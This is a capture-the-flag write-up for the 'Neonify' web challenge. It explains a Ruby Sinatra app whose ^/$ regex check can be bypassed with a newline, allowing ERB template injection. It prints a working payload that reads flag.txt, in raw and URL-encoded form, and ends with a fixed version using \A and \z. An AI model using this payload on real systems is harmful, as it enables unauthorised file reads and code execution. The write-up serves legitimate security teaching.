---
description: Easy 🔮 Web
cover: https://i.pinimg.com/564x/7c/80/6a/7c806a32e0150872d4b408c92e67766a.jpg
coverY: 0
layout:
  cover:
    visible: true
    size: hero
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Neonify

## Source code

<figure><img src="../../../../.gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>

The given code is a small web application built using the Sinatra framework, which is a lightweight web framework for Ruby. Let's break down each part of the code.

```ruby
class NeonControllers < Sinatra::Base
```

* This defines a class `NeonControllers` that inherits from `Sinatra::Base`, making this class a Sinatra application.

#### Configuration:

```ruby
configure do
  set :views, "app/views"
  set :public_dir, "public"
end
```

* The <mark style="color:red;">**`configure`**</mark> block is used to set up configuration settings for the application.
  * <mark style="color:red;">**`set :views, "app/views"`**</mark>: Specifies that the view templates (e.g., <mark style="color:red;">**`.erb`**</mark> files) are located in the `app/views` directory.
  * <mark style="color:red;">**`set :public_dir, "public"`**</mark>: Specifies that static files (like CSS, JavaScript, and images) are located in the `public` directory.

#### Route Definitions:

```ruby
get '/' do
  @neon = "Glow With The Flow"
  erb :'index'
end
```

* The <mark style="color:red;">**`get '/'`**</mark> route defines the action to be taken when a user accesses the root path (**`/`**).
  * <mark style="color:red;">**`@neon = "Glow With The Flow"`**</mark>: An instance variable <mark style="color:red;">**`@neon`**</mark> is assigned the value <mark style="color:red;">**`"Glow With The Flow"`**</mark>.
  * <mark style="color:red;">**`erb :'index'`**</mark>: Renders the <mark style="color:red;">**`index.erb`**</mark> view file (located in <mark style="color:red;">**`app/views`**</mark>). The <mark style="color:red;">**`@neon`**</mark> variable can be used within this view template.

```ruby
post '/' do
  if params[:neon] =~ /^[0-9a-z ]+$/i
    @neon = ERB.new(params[:neon]).result(binding)
  else
    @neon = "Malicious Input Detected"
  end
  erb :'index'
end
```

* The <mark style="color:red;">**`post '/'`**</mark> route is invoked when a user submits data to the root path (usually via a form submission).
  * <mark style="color:red;">**`params[:neon]`**</mark>: This retrieves the value submitted from the form field named `neon`.
  * **Regular Expression Check** <mark style="color:red;">**`params[:neon] =~ /^[0-9a-z ]+$/i`**</mark>:
    * <mark style="color:red;">**`^`**</mark>: Used to match the **beginning of a line** within a string.
    * <mark style="color:red;">**`[0-9a-z ]`**</mark>: Matches any digit, lowercase letter, or space.
    * <mark style="color:red;">**`+`**</mark>: Matches one or more of the preceding characters.
    * <mark style="color:red;">**`$`**</mark>: Used to match the **end of a line** within a string.
    * <mark style="color:red;">**`i`**</mark>: Makes the regex case-insensitive.
    * This check ensures that the input only contains alphanumeric characters and spaces.

The purpose of this code is to sanitize user input before processing it. If the above condition is satisfied, the value of the neon parameter will be used to create a new **ERB** object. **ERB** is a mechanism that allows Ruby code to be embedded in a string, and the **result(binding)** method will execute the Ruby code in that string. binding is an object that represents the current scope, allowing Ruby code in **ERB** to access existing variables and methods.

If you only use **^** and **$** without **\A** and **\z,** this can create a security hole. An attacker can inject an input string that contains a newline character (**\n**). This could allow them to inject malicious data before or after the newline character, because **^** and **$** only match the beginning and end of each line, not the entire string.

For example:

* The regular expression **^abc$** will match the string "**abc**".&#x20;
* However, the string "**abc\nmalicious\_cod**e" can also be accepted by this regular expression, because **^abc$** only checks the first line as "**abc**" without considering the "**malicious\_code**" part on the following line.

## Exploit ([Bypassing regular expression](https://davidhamann.de/2022/05/14/bypassing-regular-expression-checks/))

With that error, we can exploit this challenge easily

{% code title="Default payload" %}
```javascript
a\n<%= File.open('flag.txt').read %>
```
{% endcode %}

{% code title="URL encode" %}
```javascript
a%0A%3C%25%3D+File.open%28%27flag.txt%27%29.read+%25%3E
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
The <mark style="color:red;">**<%= ...%>**</mark> in ERB (Embedded Ruby) is a special syntax used to embed Ruby code into an HTML or text template. When the template is executed, any Ruby code within <mark style="color:red;">**<%= %>**</mark> will be executed and its result will be inserted into the corresponding position in the template.

For example:&#x20;

```ruby
params[:neon] = "Your name is <%= name %>"
erb = ERB.new(params[:neon])
name = "Bob"
result = erb.result(binding)
```

When the **result** is executed, the result will be "Your name is Bob".
{% endhint %}

#### Why the Payload Works:

* **Regex Bypass**: The newline character (**\n**) allows the attacker to bypass the regex check because **`^`** and **`$`** match the start and end of each line, not the entire string. As a result, the input string is still considered valid even though it contains potentially harmful code.
*   **Secure Solution:**

    To prevent this kind of vulnerability, you should avoid passing user input directly into ERB or any similar templating mechanism. Instead, validate and sanitize all inputs strictly, or avoid evaluating user-provided code altogether.

    One way to fix this is to use stricter validation or remove the use of `ERB` for untrusted input:

    **Example Secure Code:**

    ```ruby
    post '/' do
      if params[:neon] =~ /\A[0-9a-z ]+\z/i
        @neon = params[:neon]
      else
        @neon = "Malicious Input Detected"
      end
      erb :'index'
    end
    ```

    * **Improved Regex**: The regex **`\A[0-9a-z ]+\z/i`** ensures that the input matches the start and end of the entire string, effectively preventing newline characters and other potential exploits.
    * **No ERB Execution**: By assigning **`@neon`** directly from **`params[:neon]`** without using **`ERB.new`**, you avoid executing any Ruby code that might be injected by the user.

{% hint style="danger" %}
When testing the security of a specific restriction, be mindful of which environment you are dealing with. Sometimes, it only takes a linefeed (**\n**) to bypass a check and cause serious trouble.
{% endhint %}
